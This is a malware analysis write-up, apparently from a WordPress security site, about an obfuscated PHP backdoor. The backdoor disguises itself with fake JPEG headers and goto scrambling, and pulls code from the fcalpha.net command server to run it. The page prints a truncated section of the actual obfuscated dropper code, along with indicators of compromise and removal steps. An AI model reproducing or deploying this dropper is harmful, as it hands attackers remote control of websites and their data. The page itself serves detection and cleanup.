---
title: 'Goto Obfuscated Dropper'
slug: 'goto-obfuscated-dropper'
description: 'Technical analysis of a zero-day PHP backdoor using goto obfuscation and fake JPEG headers. Learn how the fcalpha.net dropper bypasses security scanners and how to remove it.'
reportDate: '2026-01-27'
threatType: 'Backdoor'
severity: 'High'
fileHash: 'fake-jpeg-goto-remote-dropper'
detectedPaths: ['index.php.txt']
screenshots:
  ['/images/wordpress-threats/fake-jpeg-goto-remote-dropper_evidence-1.png']
vtLink: 'https://www.virustotal.com/gui/home/upload'
vtScore: 'Zero-Day (Unique)'
impact: 'Can provide remote access to attackers, leading to data theft, unauthorized operations, or further malware deployment. Impacts include website reliability, security, and potential reputation/SEO damage.'
seenOn: 'Main index.php file'
behavior: 'Fetches and executes remote code, providing backdoor access.'
difficulty: 'Moderate'
recurrence: 'Medium'
numberOfSiteFixed: 'Not specified'
---

## Technical Analysis

The malware is an obfuscated PHP dropper using gotos for code scrambling and fake JPEG headers to mimic an image file. The core malicious function connects to a remote Command and Control (C2) server at fcalpha.net, using multiple methods such as file_get_contents, cURL, and streams. It retrieves and executes code from the C2, allowing attackers to gain control of the site. This matches the description in the user context where fake JPEG headers and strings encode a remote URL.

> **VirusTotal Analysis:** 🛡️ **Zero-Day / Fully Undetected.**

## Attack Chain

1. Step 1: The malicious index.php pretends to be a JPEG using fake headers.
2. Step 2: It uses goto statements to obfuscate and execute HTTP requests to the C2 server.
3. Step 3: If successful, it retrieves and executes code from the C2, using eval() for code execution.

## Code Signature(s)

### FILE: `index.php`

```php
<?php
 goto WTfU8; vEBti: $UcrKS = "\57\167\145\142\x2f\x70\150\157\164\157\x2f\62\x30\x31\65\61\60\x32\x34\57\x6d\x2e\164\x78\164"; goto LaT5t; IzFri: RvG0V: goto GbU5V; dL5yV: LBHDG: goto UpS3n; zL9PA: $xopLq = "\150\x74\164\x70\163"; goto hvW_P; jNAY7: echo "\xef\xbf\275\xef\277\xbd\x2"; goto c0y7q; TSJQa: function AX1iG($RE2ty, $t1fsx) { goto Lsx8T; zFNPy: return false; goto rvkz3; El_p2: t73TX: goto zFNPy; k3A7f: e91y6: goto El_p2; Lsx8T: switch ($t1fsx) { case "\146\x69\x6c\x65\x5f\x67\145\x74\x5f\143\157\156\164\x65\x6e\164\x73": goto Z8rea; z7ZWa: QAgNv: goto uKqIH; Z8rea: if (!ini_get("\x61\154\x6c\x6f\x77\x5f\165\162\154\137\146\x6f\160\145\156")) { goto QAgNv; } goto Gy4Fr; uKqIH: goto t73TX; goto AwiVo; Gy4Fr: return file_get_contents($RE2ty); goto z7ZWa; AwiVo: case "\143\165\162\x6c": goto sM1Oa; iV7Zo: return $BIWlj; goto S37FP; S37FP: tAl69: goto Wx2nj; GvqnQ: curl_setopt($WbNoe, CURLOPT_RETURNTRANSFER, true); goto v_90S; x2gMk: $BIWlj = curl_exec($WbNoe); goto iT3iM; Wx2nj: goto t73TX; goto fp6dm; iT3iM: curl_close($WbNoe); goto iV7Zo; vmFgM: $WbNoe = curl_init($RE2ty); goto GvqnQ; sM1Oa: if (!function_exists("\x63\x75\162\x6c\x5f\166\x65\x72\163\151\x6f\156")) { goto tAl69; } goto vmFgM; v_90S: curl_setopt($WbNoe, CURLOPT_SSL_VERIFYPEER, false); goto x2gMk; fp6dm: case "\163\x74\162\145\141\x6d": goto k72yN; k72yN: if (!($ZTFHr = fopen($RE2ty, "\162"))) { goto WLBOt; } goto nnJov; Qojbp: return $Wdq1o; goto WvSGP; WvSGP: WLBOt: goto su1Pk; nnJov: $Wdq1o = stream_get_contents($ZTFHr); goto DHowU; DHowU: fclose($ZTFHr); goto Qojbp; su1Pk: goto t73TX; goto YrSkX; YrSkX: default: return false; } goto k3A7f; rvkz3: } goto iANvS; LFHZG: pLFWI: goto T20vS; GbU5V: if ($Wdq1o !== false) { goto pLFWI; } goto jNAY7; LaT5t: $RE2ty = $xopLq . "\x3a\x2f\57" . $P5YHG . $UcrKS; goto TSJQa; GL22s: foreach ($GtzTu as $t1fsx) { goto QXnjZ; QXnjZ: $Wdq1o = AX1ig($RE2ty, $t1fsx); goto qq3K4; rGzW8: OPPp1: goto wWv5i; wWv5i: ewPMr: goto FzGdN; qq3K4: if (!($Wdq1o !== f
```

## Indicators of Compromise (IOCs)

- `fcalpha.net`
- `$xopLq = "https"`
- `$P5YHG = "www.fcalpha.net"`
- `/web/photo/20151024/m.txt`

## Removal Protocol

1. Step 1: Locate and replace the infected index.php with a clean one from the WordPress repository.
1. Step 2: Block the domain 'fcalpha.net' via the server's firewall or hosts file.
1. Step 3: Review access logs for other suspicious actions and files.

> **Status:** Active Threat.  
> **Verification:** Verified by MD Pabel.
